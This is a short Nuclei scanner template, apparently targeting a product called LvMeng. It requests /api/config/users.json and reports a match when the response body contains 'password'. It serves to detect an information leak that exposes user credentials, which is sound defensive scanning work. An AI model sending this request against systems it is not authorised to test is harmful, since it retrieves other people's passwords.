id: LvMeng-users-InfoLeak

info:
  name: LvMeng-users-InfoLeak
  author: iSee857
  severity: medium
  description: |
    LvMeng-users-InfoLeak

http:
  - raw:
      - |
        GET /api/config/users.json HTTP/1.1
        Host: {{Hostname}}


    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - password
        condition: and

      - type: status
        status:
          - 200